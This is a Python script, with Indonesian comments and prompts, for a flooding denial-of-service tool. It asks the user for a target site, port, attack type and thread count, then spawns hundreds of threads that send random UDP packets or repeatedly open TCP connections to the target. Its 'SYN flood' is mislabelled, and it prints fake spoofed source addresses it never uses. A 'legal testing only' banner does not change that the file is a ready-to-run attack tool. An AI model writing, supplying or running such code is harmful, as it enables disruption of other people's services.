import socket
import threading
import random
import time
from colorama import Fore, Style, init

# Inisialisasi pewarnaan terminal
init(autoreset=True)

# Banner alat
def banner():
    print(Fore.RED + Style.BRIGHT + """
    
███████╗████████╗██╗  ██╗███████╗███╗   ██╗ ██████╗ ███████╗
██╔════╝╚══██╔══╝██║  ██║██╔════╝████╗  ██║██╔═══██╗██╔════╝
███████╗   ██║   ███████║█████╗  ██╔██╗ ██║██║   ██║███████╗
╚════██║   ██║   ██╔══██║██╔══╝  ██║╚██╗██║██║   ██║╚════██║
███████║   ██║   ██║  ██║███████╗██║ ╚████║╚██████╔╝███████║
╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝
    """)

    print(Fore.YELLOW + "⚠️ Gunakan hanya untuk tujuan pengujian legal!")
    print(Fore.CYAN + "💣 Skrip ini akan mengirimkan serangan dengan intensitas tinggi!\n")


# Fungsi utama serangan
def attack(target, port, attack_type, num_threads):
    try:
        print(Fore.GREEN + f"🎯 Menyerang {target}:{port} dengan {attack_type} menggunakan {num_threads} thread...\n")

        def udp_flood():
            """Fungsi untuk melakukan serangan UDP Flood"""
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random._urandom(1024)  # Data acak 1024 byte
            while True:
                try:
                    sock.sendto(data, (target, port))
                    print(Fore.MAGENTA + f"🔥 [UDP] Paket dikirim ke {target}:{port}")
                except:
                    break

        def tcp_syn_flood():
            """Fungsi untuk melakukan serangan TCP SYN Flood"""
            while True:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    sock.connect((target, port))
                    sock.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode("ascii"))
                    print(Fore.BLUE + f"🚀 [TCP] SYN paket dikirim ke {target}:{port} dari {fake_ip}")
                    sock.close()
                except:
                    break

        # Memulai thread sesuai attack type
        for _ in range(num_threads):
            if attack_type == "UDP":
                thread = threading.Thread(target=udp_flood)
            elif attack_type == "TCP":
                thread = threading.Thread(target=tcp_syn_flood)
            thread.start()

    except Exception as e:
        print(Fore.RED + f"❌ Kesalahan: {e}")


# Fungsi input dari pengguna
def main():
    banner()

    target = input(Fore.YELLOW + "Masukkan alamat situs target (tanpa http/https): ")
    port = int(input(Fore.YELLOW + "Masukkan port target (default 80 untuk HTTP): ") or 80)
    attack_type = input(Fore.YELLOW + "Pilih jenis serangan (UDP/TCP): ").upper()
    num_threads = int(input(Fore.YELLOW + "Masukkan jumlah thread (misal: 100-500): ") or 200)

    print(Fore.CYAN + f"\n🎯 Target: {target}:{port}")
    print(Fore.CYAN + f"🚀 Jenis Serangan: {attack_type}")
    print(Fore.CYAN + f"🔗 Thread: {num_threads}\n")

    # Konfirmasi sebelum memulai serangan
    confirm = input(Fore.RED + "⚠️ Apakah Anda yakin ingin memulai serangan? (y/n): ").lower()
    if confirm == 'y':
        attack(target, port, attack_type, num_threads)
    else:
        print(Fore.YELLOW + "Serangan dibatalkan. Keluar...")
        exit()


if __name__ == "__main__":
    main()
